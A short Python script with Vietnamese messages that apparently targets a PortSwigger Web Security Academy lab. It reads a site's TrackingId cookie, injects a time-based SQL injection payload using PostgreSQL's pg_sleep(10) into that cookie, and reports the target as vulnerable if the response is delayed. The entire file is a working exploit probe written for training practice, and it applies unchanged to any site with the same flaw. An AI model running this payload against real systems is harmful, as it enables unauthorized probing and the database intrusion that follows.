import requests
import time

def extract_tracking_id(set_cookie_header):
    cookie_parts = set_cookie_header.split(';')
    for part in cookie_parts:
        if part.strip().startswith('TrackingId='):
            return part.strip().split('=')[1]
    return None

def check_time_based_sqli(url, tracking_id, session_cookie):
    # Tạo payload sử dụng pg_sleep (PostgreSQL)
    payload = f"{tracking_id}'||pg_sleep(10)--"

    cookies = {
        "TrackingId": payload,
        "session": session_cookie
    }

    print("[*] Gửi payload có chứa pg_sleep(10)...")
    start_time = time.time()
    try:
        response = requests.get(url, cookies=cookies, timeout=15)
    except requests.exceptions.Timeout:
        print("[!] Timeout - server có thể đã bị delay do payload.")
        return True
    except Exception as e:
        print(f"[!] Lỗi khi gửi request: {e}")
        return False

    elapsed = time.time() - start_time
    print(f"[+] Phản hồi sau {elapsed:.2f} giây.")

    if elapsed >= 9:
        print("[+] Có khả năng bị time-based SQLi (delay >= 9s)")
        return True
    else:
        print("[-] Không có độ trễ đáng kể.")
        return False

if __name__ == "__main__":
    print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
    url = input("Nhập URL: ").rstrip("/")

    try:
        response = requests.get(url)
    except requests.RequestException as e:
        print(f"[!] Lỗi khi truy cập URL: {e}")
        exit()

    tracking_id = None
    if 'Set-Cookie' in response.headers:
        tracking_id = extract_tracking_id(response.headers['Set-Cookie'])

    if tracking_id:
        print(f"[+] TrackingId tìm thấy: {tracking_id}")
        session_cookie = input("Nhập session cookie: ").strip()
        check_time_based_sqli(url, tracking_id, session_cookie)
    else:
        print("[-] Không tìm thấy TrackingId trong phản hồi.")
